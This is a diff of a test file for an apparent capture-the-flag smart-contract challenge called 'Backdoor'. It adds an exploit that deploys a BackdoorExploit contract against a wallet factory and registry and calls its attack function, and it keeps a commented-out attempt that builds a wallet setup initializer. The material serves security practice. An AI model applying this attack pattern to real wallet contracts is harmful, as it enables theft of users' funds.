@@ -36,7 +36,36 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** CODE YOUR EXPLOIT HERE */    
+        // const abi = this.masterCopy.interface;
+        // console.log(abi);
+        // const initializer = abi.encodeFunctionData("setup", [
+        //     [users[0]],
+        //     1,
+        //     ethers.constants.AddressZero,
+        //     ethers.constants.HashZero,
+        //     ethers.constants.AddressZero,
+        //     ethers.constants.AddressZero,
+        //     0,
+        //     ethers.constants.AddressZero,
+        // ]);       
+        // //console.log(payload);
+        // await this.walletFactory.connect(attacker).createProxyWithCallback(
+        //     this.masterCopy.address,
+        //     initializer,
+        //     0,
+        //     this.walletRegistry.address,
+        // );
+
+        const factory = await ethers.getContractFactory('BackdoorExploit', attacker);
+        const instance = await factory.deploy(
+            this.walletFactory.address, 
+            this.token.address, 
+            this.walletRegistry.address,
+            users,
+        );
+        //execute exploit
+        await instance.connect(attacker).attack(this.masterCopy.address);         
     });
 
     after(async function () {
